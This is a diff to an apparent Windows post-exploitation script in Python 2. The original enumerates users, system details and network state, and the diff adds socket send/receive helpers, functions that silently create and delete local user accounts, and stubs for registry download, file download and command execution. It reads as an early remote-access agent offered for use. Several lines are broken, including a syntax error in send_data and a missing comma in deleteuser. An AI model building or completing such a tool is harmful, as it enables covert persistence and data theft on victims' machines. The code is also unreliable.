@@ -1,6 +1,16 @@
-import subprocess
+import subprocess, socket, time, struct
+from _winreg import *
 
-
+def recv_data(sock):
+	data_len, = struct.unpack("!I", sock.recv(4))
+	return sock.recv(data_len)
+	
+def send_data(sock,data):
+	data_len, = struct.unpack("!I", data_len))
+	sock.send(data)
+	return
+	
+	
 def networkgather():
 	
 	print "========================="
@@ -11,7 +21,7 @@ def networkgather():
 	netview = ("net", "view")
 	
 	ipconfig = ("ipconfig", "/all")
-	#nbtstat = (" nbtstat", "-n") For some reason this command isn't being recognized.
+ #	nbtstat = (" nbtstat", "-n") For some reason this command isn't being recognized.
 	netstat = ("netstat", "-o")
 	
 	cmdlist = [arp, netview,ipconfig, netstat]
@@ -55,6 +65,33 @@ def systeminfogather():
 	print ''
 	print ''
 
+def createuser(name, pwd, log_file):
+	cmd = ["net", "user", "/add", name, pwd]
+	subprocess.Popen(cmd, 0, None, None, log_file, log_file, shell=True).wait()
+	log_file.close()
+	return
+	
+def deleteuser(name, log_file):
+	cmd = ["net", "user" "/del", name]
+	subprocess.Popen(cmd, 0, None, None, log_file,log_file, shell=True).wait()
+	log_file.close()
+
+	return
+	
+def download_registry(root, path, sock):
+	
+	key_hdl = OpenKey(root,path)
+	num_subkeys, num_values, last_modified = QueryInfoKey(key_hdl)
+	
+	return
+
+def download_file():
+	return
+	
+def execute_command():
+	return
+	
+
 def endlog():
 	print ""
 	print ""
@@ -64,6 +101,7 @@ def endlog():
 	print "================"
 
 def main():
+	f = open("log.txt","w")
 	useraccountsenum()
 	systeminfogather()
 	networkgather()
